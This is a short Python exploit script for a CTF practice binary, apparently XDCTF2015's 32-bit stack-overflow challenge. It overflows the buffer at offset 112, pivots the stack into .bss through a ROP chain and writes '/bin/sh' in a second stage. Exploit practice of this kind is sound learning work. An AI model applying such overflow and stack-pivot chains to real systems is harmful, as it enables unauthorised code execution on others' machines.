# from LibcSearcher import *
from helper import *
from pwncli import *
import ctypes as c
from exp import ret2libc_A, ret2libc_B
from helper import heap
loader = Loader("target/bof_norelro_32", 32, debug=False)
# loader.patch_AIO(2.27)
elf,libc,rop = loader.init()
# io = loader.process()
io = loader.ida()
abbre(globals(), io, loader) # 此处定义了常用的缩写
menu(globals())
# loader.get_addrs()
# context.log_level="debug"

offset = 112

bss_addr = elf.bss()

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw(b'a' * offset) # fill2ret
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
io.sendline(rop.chain())

# write "/bin/sh"
rop = ROP(loader.root)
sh = b"/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw(b'a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw(b'a' * (100 - len(rop.chain())))
io.sendline(rop.chain())

io.interactive()